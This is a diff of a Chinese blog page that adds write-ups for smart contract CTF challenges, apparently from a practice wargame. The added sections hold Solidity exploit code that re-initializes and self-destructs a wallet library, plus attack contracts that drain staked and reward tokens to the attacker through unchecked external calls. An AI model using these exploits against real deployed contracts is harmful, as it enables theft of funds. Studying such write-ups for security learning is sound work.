@@ -351,14 +351,14 @@ publicSaleMint方法有一个修饰符isEOA()，绕过她十分简单，">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    825
+                    1.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    5 分
                 </div>
                 
 
@@ -578,7 +578,68 @@ public
     validation();
 }
 </code></pre>
-<h2 id="Safu-Wallet"><a href="#Safu-Wallet" class="headerlink" title="Safu Wallet"></a>Safu Wallet</h2>
+<h2 id="Safu-Wallet"><a href="#Safu-Wallet" class="headerlink" title="Safu Wallet"></a>Safu Wallet</h2><p>如果我们能够通过修饰符onlymanyowners()，我们就可以破坏合约。</p>
+<p>我们通过观察很容一发现，SafuWallet 合约是代理合约SafuWalletLibrary为逻辑合约。<br>这意味着这意味着我们虽然调用了initWallet()，但是SafuWalletLibrary的状态并未改变。<br>我们依然可以调用initWallet();</p>
+<pre><code>addresses = new address[](1);
+addresses[0] = attacker;
+data = abi.encodeWithSignature("initWallet(address[],uint256,uint256)", addresses, 1, type(uint).max);
+address(safuWalletLibrary).call(data);
+
+data = abi.encodeWithSignature("kill(address)", address(attacker));
+address(safuWalletLibrary).call(data);
+</code></pre>
+<h2 id="Tasty-Stake"><a href="#Tasty-Stake" class="headerlink" title="Tasty Stake"></a>Tasty Stake</h2><p>这题和Safu Vault的漏洞相似。migrateStake()方法意在将旧的TastyStaking合约中的STEAK和reward代币转移到本合约上。<br>但未对外部调用审查。</p>
+<p>因此我们可以创建一个有migrateWithdraw()方法的合约。</p>
+<pre><code>contract Attack {
+    address owner;
+    TastyStaking _tastyStaking;
+    Token stakingToken;
+
+    constructor(address _target, address _stakingToken) {
+        attacker = msg.sender;
+        _tastyStaking = TastyStaking(_target);
+        stakingToken = Token(_stakingToken);
+    }
+
+  
+    function migrateWithdraw(address staker, uint256 amount) external {
+        
+    }
+
+    function pwn() external {
+        _tastyStaking.migrateStake(address(this), stakingToken.balanceOf(address(_tastyStaking)));
+        _tastyStaking.withdrawAll(false);
+        stakingToken.transfer(attacker, stakingToken.balanceOf(address(this)));
+    }
+}
+</code></pre>
+<h2 id="Freebie"><a href="#Freebie" class="headerlink" title="Freebie"></a>Freebie</h2><p>额，这题与Tasty Stake的漏洞一模一样。</p>
+<pre><code>contract Attack {
+    Token farm;
+    GovToken govToken;
+    RewardsAdvisor rewardsAdvisor;
+    address attacker;
+
+    constructor(address _target, address _farm, address _xfarm) {
+        farm = Token(_farm);
+        govToken = GovToken(_xfarm);
+        rewardsAdvisor = RewardsAdvisor(_target);
+        attacker = msg.sender;
+    }
+
+    
+    function delegatedTransferERC20(address token, address to, uint256 amount) external {
+        
+    }
+
+    function pwn(address _target) external {
+        uint256 amount = govToken.balanceOf(address(_target)) * uint256(10000) / uint256(1);
+        rewardsAdvisor.deposit(amount, payable(address(this)), address(this));
+        rewardsAdvisor.withdraw(govToken.balanceOf(address(this)), attacker, payable(address(this)));
+    }
+}
+</code></pre>
+<h2 id="NFT-Bonanza"><a href="#NFT-Bonanza" class="headerlink" title="NFT Bonanza"></a>NFT Bonanza</h2><h2 id="Inflationary-Net-Worth"><a href="#Inflationary-Net-Worth" class="headerlink" title="Inflationary Net Worth"></a>Inflationary Net Worth</h2>
                 
             </div>
             <hr/>
@@ -1041,7 +1102,7 @@ public
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">8k</span>
+                        class="white-color">8.3k</span>
             
             
             
